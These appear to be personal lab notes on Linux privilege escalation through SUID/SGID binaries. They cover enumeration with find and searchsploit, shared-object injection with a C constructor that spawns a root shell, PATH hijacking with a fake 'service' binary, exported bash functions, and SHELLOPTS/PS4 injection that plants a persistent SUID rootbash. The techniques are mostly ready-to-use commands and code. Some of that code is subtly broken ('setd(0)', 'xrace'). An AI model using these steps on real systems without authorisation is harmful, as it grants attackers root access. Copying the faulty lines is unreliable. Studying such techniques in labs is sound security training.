SUID is executed with the privileges of file **owner**
SGID is executed with the privileges of the file **group**


**Enumerating for SUID and SGID Bits**
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
![](assets/Pasted%20image%2020260531154856.png)


**Shell Escape Sequences**
- check GTFOBins for any notable programs with SUID/SGID set


**Known Exploits**
- certain programs install SUID files to aid in operation
- can be found using searchsploit and Google (same way as kernel exploits)
![](assets/Pasted%20image%2020260531155120.png)
- exim is known to have security vulnerabilities
- `searchsploit exim 4.84.3`
![](assets/Pasted%20image%2020260531155222.png)
- if searchsploit doesn't return, try making a broader search

- if exploit code returns the error "...^M: bad interpreter", we know it was written with Windows newline
	- can get rid of the offending characters with the following sed command
	- `sed -i -e "s/^M//" <file>`
		- to get `^M`, > ctrl + v, press M
![](assets/Pasted%20image%2020260531155506.png)


**Shared Object Injection**
by using strace, we can track system calls and determine if shared objects weren't found
- then we can take these over

using LSE
![](assets/Pasted%20image%2020260531155559.png)
- looking at suid-so file

use strace to see what it's calling
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
![](assets/Pasted%20image%2020260531155753.png)
- tries to load a number of shared objects but fails
	- specifically the libcalc.so file in our user's home directory

create .config file in the user's home directory and make the file
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```
- now compile into libcalc.so and run again
`gcc -shared -fPIC -o libcalc.so libcalc.c`
![](assets/Pasted%20image%2020260531160007.png)



**PATH Environmental Variable**
abusing relative paths when absolute paths should be used
- can tell shell to first look for programs in a directory we can write to
- can run strings on the executable file for potential candidates
- or use stract / ltrace

```
# strings
strings /path/to/file

# strace
strace -v -f -e execve <command> 2>&1 | grep exec

# ltrace
ltrace <command>
```
![](assets/Pasted%20image%2020260531160222.png)
- suid-env should run with root privs
![](assets/Pasted%20image%2020260531160246.png)
- can see here it's trying to run the service command

can confirm using strace
![](assets/Pasted%20image%2020260531160325.png)
- service does not use an absolute path > can create our own to use with suid-so

create service.c
```
int main() {
	setd(0);
	system("/bin/bash -p");
}
```

compile
`gcc -o service service.c`

append current directory to PATH
`PATH=.:$PATH /usr/local/bin/suid-env`
- should get the root shell
![](assets/Pasted%20image%2020260531160531.png)


**Abusing Shell Features #1**
in some shells (Bash < 4.2-048) it is possible to define user functions
![](assets/Pasted%20image%2020260531160622.png)

running strings against suid-env2
![](assets/Pasted%20image%2020260531160646.png)
- same as before, just with absolute path now
- should only be exploitable if we can write to `/usr/sbin/service`, but with certain versions of bash we still can exploit
![](assets/Pasted%20image%2020260531160726.png)
- 4.1.5(1)-release is vulnerable
- created functions take precenence

create function
`function /usr/sbin/service { /bin/bash -p; }`

export function
`export -f /usr/sbin/service`

run suid file
`/usr/local/bin/suid-env2`


**Abusing Shell Features #2**
- bash has debugging mode which can be enabled with `-x`
	- or modifying SHELLOPTS env variable
	- can include an embedded command
- if an SUID file runs another program via bash (by using system()), these env vars can be inherited
- bash versions < 4.4 are vulnerable

finding SUID/SGID
![](assets/Pasted%20image%2020260531161042.png)

run strace to see service executable is being used
![](assets/Pasted%20image%2020260531161106.png)

check version of bash
`/bin/sh --version`
![](assets/Pasted%20image%2020260531161124.png)
- 4.1.x is vulnerable

create modified env
`env -i SHELLOPTS=xrace PS4='<test>' /usr/local/bin/suid-env2`
![](assets/Pasted%20image%2020260531161208.png)
- can see `<test>` is prepended to each line of output

trying whoami
`env -i SHELLOPTS=xrace PS4='$(whoami)' /usr/local/bin/suid-env2`
![](assets/Pasted%20image%2020260531161308.png)

getting root shell
`env -i SHELLOPTS=xrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2`
![](assets/Pasted%20image%2020260531161413.png)



**Rootbash SUID**
creating a copy of `/bin/bash` and executing it with the `-p` flag
- needs to be owned by root and have SUID bit set
- benefit is that it is persistent

